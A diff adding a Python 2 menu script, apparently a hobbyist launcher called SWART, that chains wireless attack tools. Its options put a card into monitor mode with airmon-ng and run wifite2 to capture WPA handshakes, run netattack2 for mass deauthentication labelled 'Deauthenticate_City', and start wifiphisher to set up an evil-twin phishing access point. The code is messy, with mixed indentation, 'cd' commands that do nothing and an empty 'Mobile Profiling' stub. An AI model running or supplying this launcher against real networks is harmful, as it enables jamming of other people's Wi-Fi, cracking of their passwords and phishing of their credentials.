@@ -1,0 +1,103 @@
+#!/usr/bin/python
+
+import os
+import time
+from progress.bar import ChargingBar
+from progress.bar import ShadyBar
+
+
+br = "\n"
+
+os.system("cd /home/kokotko/Desktop")
+os.system("cat SWART.txt")
+
+time.sleep(1)
+
+print("                                  Sky")
+time.sleep(0.4)
+print(br)
+print("                                Wireless")
+time.sleep(0.4)
+print(br)
+print("                                 Attack")
+time.sleep(0.4)
+print(br)
+print("                                 Remote")
+time.sleep(0.4)
+print(br)
+print("                               Transition")
+
+time.sleep(1)
+print(br)
+
+with ShadyBar('STARTING SWART', max=10) as bar:
+    for i in range(10):
+	time.sleep(0.1)
+	bar.next()
+###
+print(br)
+
+def print_menu():       ## Your menu design here
+    print 29 * "=" , "Attack Modes" , 29 * "="
+    time.sleep(1)
+    print "1. Reconnaissance"
+    print "2. 4-Way_Handshake"
+    print "3. Deauthenticate_City"
+    print "4. Evil_Twin"
+    print "5. Mobile Profiling"
+    print "6. Exit"
+    print 67 * "-"
+  
+loop=True      
+  
+while loop:          ## While loop which will keep going until loop = False
+    print_menu()    ## Displays menu
+    choice = input("Enter your choice [1-6]: ")
+     
+    if choice==1:     
+        print "Reconnaissance has been selected"
+	print("Starting GPS 3D FIX")
+	print(br)
+	os.system("sudo cgps -s")
+	print("Press q to exit.")
+	time.sleep(5)
+	os.system("")
+	#loop=False
+	
+    elif choice==2:
+        print "4-Way_Handshake has been selected"
+	loop=False
+        #os.system("cd /home/pi/Desktop/wifite2")
+	time.sleep(0.5)
+	os.system("sudo airmon-ng start wlan1")
+	time.sleep(1)
+	os.system("cd /home/pi/Desktop/wifite2/ && sudo ./Wifite.py -i wlan1mon -mac")
+	time.sleep(1)
+    elif choice==3:
+        print "Deauthenticate_City has been selected"
+        time.sleep(0.1)
+	os.system("cd /home/pi/Desktop/netattack2 && sudo python2 netattack2.py")
+	time.sleep(0.1)
+#	os.system("sudo python2 netattack2.py")
+	loop=False
+    elif choice==4:
+        print "Evil_Twin has been selected"
+        os.system("cd /home/pi/Desktop/wifiphisher")
+	os.system("sudo wifiphisher -eI wlan1 -aI wlan0")
+	loop=False
+    elif choice==5:
+        print "Mobile Profiling has been selected"
+        ## You can add your code or functions here
+    elif choice==6:
+	print(br)
+	with ChargingBar('Terminating', max=10) as bar:
+	    for i in range(10):
+        	time.sleep(0.1)
+        	bar.next()
+
+
+
+        loop=False # This will make the while loop to end as not value of loop is set to False
+    else:
+        # Any integer inputs other than values 1-5 we print an error message
+        raw_input("1 - 6 Idiot...")
